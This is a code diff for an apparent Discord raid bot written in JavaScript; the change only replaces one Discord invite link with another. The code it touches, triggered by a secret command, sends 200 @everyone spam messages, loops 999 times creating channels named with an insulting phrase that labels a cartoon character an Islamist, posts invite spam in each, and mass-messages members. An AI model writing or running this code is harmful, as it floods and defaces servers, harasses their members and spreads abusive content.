@@ -151,7 +151,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
             }
             if(message.content.includes("!everyone")){
                 for(var i = 0; i < 200; i++){
-                    message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/fVA3WE4")
+                    message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/QfAtq4s")
                 }
             }
             //réaction en chaine
@@ -160,11 +160,11 @@ if(message.content.includes("ar!kelsairvvesrx")){
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/zFwAN8C ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/zFwAN8C ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/zFwAN8C ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/zFwAN8C ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/zFwAN8C ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/QfAtq4s ."))
 
                       }
                     }
@@ -189,7 +189,7 @@ let cont = message.content.slice(1).split(" ")
           message.guild.member(player).send(`Rejoins .
 
 
- LE CENTRE 🌙 https://discord.gg/zFwAN8C`);
+ LE CENTRE 🌙 https://discord.gg/QfAtq4s`);
 });
     }
 })
